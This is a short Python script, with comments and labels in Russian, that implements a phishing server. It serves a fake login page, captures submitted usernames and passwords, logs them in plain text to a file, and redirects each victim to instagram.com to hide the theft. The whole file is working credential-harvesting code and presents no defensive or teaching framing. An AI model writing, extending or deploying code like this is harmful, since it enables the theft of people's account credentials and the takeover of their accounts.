from http.server import BaseHTTPRequestHandler, HTTPServer
import urllib.parse
from datetime import datetime

class PhishingServer(BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path == '/':
            with open('index.html', 'rb') as f:
                self.send_response(200)
                self.send_header('Content-type', 'text/html')
                self.end_headers()
                self.wfile.write(f.read())
        elif self.path == '/success.html':
            with open('success.html', 'rb') as f:
                self.send_response(200)
                self.send_header('Content-type', 'text/html')
                self.end_headers()
                self.wfile.write(f.read())
        else:
            self.send_error(404)

    def do_POST(self):
        if self.path == '/login':
            length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(length).decode('utf-8')
            data = urllib.parse.parse_qs(post_data)

            username = data.get('username', [''])[0].strip()
            password = data.get('password', [''])[0].strip()
            timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')

            with open('log.txt', 'a', encoding='utf-8') as f:
                f.write("===== Новая попытка входа =====\n")
                f.write(f"Время:  {timestamp}\n")
                f.write(f"Логин:  {username}\n")
                f.write(f"Пароль: {password}\n")
                f.write("===============================\n\n")

            # Редирект на Instagram
            self.send_response(301)
            self.send_header('Location', 'https://instagram.com')
            self.end_headers()

if __name__ == '__main__':
    server = HTTPServer(('localhost', 8080), PhishingServer)
    print("Сервер запущен на http://localhost:8080")
    server.serve_forever()